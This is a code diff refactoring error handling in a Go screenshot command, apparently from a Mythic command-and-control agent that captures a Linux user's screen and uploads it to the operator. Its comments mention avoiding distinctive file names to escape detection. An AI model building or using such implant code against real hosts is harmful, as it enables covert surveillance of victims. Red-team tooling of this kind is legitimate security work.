@@ -28,21 +28,13 @@ func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResul
 	waylandDisplay := os.Getenv("WAYLAND_DISPLAY")
 
 	if display == "" && waylandDisplay == "" {
-		return structs.CommandResult{
-			Output:    "No display server detected (DISPLAY and WAYLAND_DISPLAY not set). Screenshot requires a graphical session.",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("No display server detected (DISPLAY and WAYLAND_DISPLAY not set). Screenshot requires a graphical session.")
 	}
 
 	// Create temp file for screenshot — random name (no distinctive pattern)
 	tf, tfErr := os.CreateTemp("", "*.png")
 	if tfErr != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating temp file: %v", tfErr),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating temp file: %v", tfErr)
 	}
 	tmpFile := tf.Name()
 	tf.Close()
@@ -67,33 +59,21 @@ func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResul
 
 	if err != nil {
 		os.Remove(tmpFile)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Screenshot failed: %v\nEnsure a screenshot tool is installed (import/scrot/gnome-screenshot for X11, grim for Wayland)", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Screenshot failed: %v\nEnsure a screenshot tool is installed (import/scrot/gnome-screenshot for X11, grim for Wayland)", err)
 	}
 
 	// Read the screenshot file
 	imgData, err := os.ReadFile(tmpFile)
 	if err != nil {
 		os.Remove(tmpFile)
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading screenshot file: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading screenshot file: %v", err)
 	}
 
 	// Clean up temp file
 	os.Remove(tmpFile)
 
 	if len(imgData) == 0 {
-		return structs.CommandResult{
-			Output:    "Screenshot captured but file was empty (no display available?)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Screenshot captured but file was empty (no display available?)")
 	}
 
 	// Send screenshot to Mythic
@@ -119,11 +99,7 @@ func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResul
 			}
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
-				return structs.CommandResult{
-					Output:    "Screenshot upload cancelled",
-					Status:    "error",
-					Completed: true,
-				}
+				return errorResult("Screenshot upload cancelled")
 			}
 		}
 	}
